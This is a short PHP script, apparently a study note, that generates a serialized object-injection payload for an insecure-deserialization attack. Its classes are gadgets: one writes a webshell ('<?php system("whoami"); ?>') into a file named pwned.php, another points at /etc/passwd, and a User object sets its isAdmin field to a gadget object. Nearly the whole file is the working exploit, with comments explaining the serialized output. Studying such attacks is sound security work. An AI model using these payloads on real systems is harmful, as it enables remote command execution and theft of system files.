<?php

class LogFile
{
    public function __construct()
    {
        $this -> filename ='/home/devil/Notes/php/pwned.php';//file to save the content of below
        $this -> username = '<?php system("whoami"); ?>';
    }
}

//just Creating the objects
//__construct is a special function inside a class that runs automatically when you create a new object using new
//$

class Readfile
{
    public function __construct()
    {
        $this -> filename = '/etc/passwd';
    }
    //so when we do this 
    //output--->O:4:"User":2:{s:8:"username";O:8:"Readfile":1:{s:8:"filename";s:11:"/etc/passwd";}s:7:"isAdmin";b:1;}
    //instead of username being string it's an object has 8 chars Readfile
    //and has 1 item ant its single item is filename
}


class User
{
    public function __construct()
    {
        //$this -> username = 'ippsec';
        //$this -> username = new Readfile();
        //$this -> username = new LogFile();
        $this -> username = 'ippsec';
        //$this -> isAdmin = True;
        $this -> isAdmin = new LogFile();
    }
}

$obj = new User();
echo serialize($obj);



?>
